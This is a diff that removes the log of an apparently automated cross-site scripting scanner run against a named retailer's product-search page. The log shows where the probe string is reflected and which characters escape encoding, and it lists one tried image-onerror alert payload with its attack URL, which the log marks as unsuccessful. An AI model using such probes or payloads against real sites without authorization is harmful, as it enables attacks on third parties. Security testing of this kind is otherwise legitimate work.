@@ -1,51 +1,0 @@
-https://www.borsheims.com/classic-collection-engagement-rings
-
-GET Params:[1]
-['Search']
-_______________________________________________________________________________________________________
-https://www.borsheims.com/product-search?Search=(uvw"xyz'yxz</zxy
-
-----------------------------------------------------------------------------------
-Attribute Context: [2]
-<input type="search" name="Search" aria-labelledby="js-search-form--label" aria-label="Search" id="l-desktop-search" value="&#40;uvw&quot;xyz'yxz&lt;/zxy" placeholder="Search" class="column five-sixths bg-transparent input input-medium search-input" autocomplete="off">
-<input id="l-mobile-search" type="search" name="Search" aria-labelledby="js-search-form--label__mobile" aria-label="Search" value="&#40;uvw&quot;xyz'yxz&lt;/zxy" placeholder="What would you like to search for?" class="column five-sixths bg-transparent input input-medium search-input" autocomplete="off">
-
-----------------------------------------------------------------------------------
-HTML Context: [1]
-<span class="capitalize">(uvw"xyz'yxz</zxy</span>
-
-----------------------------------------------------------------------------------
-Script Context: [1]
-<script>dataLayer = [{"pageCode": "SRCH","pageType": "searchresults","pageName": "Product Search","userId": "0","userEmail": "","basketId": "36841942","pageView": "/product-search?Search=%28uvw%22xyz%27yxz%3C%2Fzxy","categoryCode": "","categoryName": "","productCode": "","productCodeAlt": "","checkoutStep": "",}];</script>
-
-----------------------------------------------------------------------------------
-URI Context: [0]
-
-----------------------------------------------------------------------------------
-
-
-ENCODING     Presence	"	'	<	( 
-ATTR:		True	True	False	True	True
-
-Attack Payloads for ATTR
-[]
-ENCODING     Presence	"	'	<	( 
-ATTR:		True	True	False	True	True
-
-Attack Payloads for ATTR
-[]
-ENCODING     Presence	"	'	<	( 
-HTML:		True	False	False	False	False
-
-Attack Payloads for HTML
-['<img src=x onerror="alert(1)">']
-
-HTML Attack Url: https://www.borsheims.com/product-search?Search=<img src=x onerror="alert(1)">
-
- ______ UnSuccessful with payload: <img src=x onerror="alert(1)">
-
-ENCODING     Presence	"	'	<	( 
-SCRIPT:		True	True	True	True	True
-
-Attack Payloads for SCRIPT
-[]
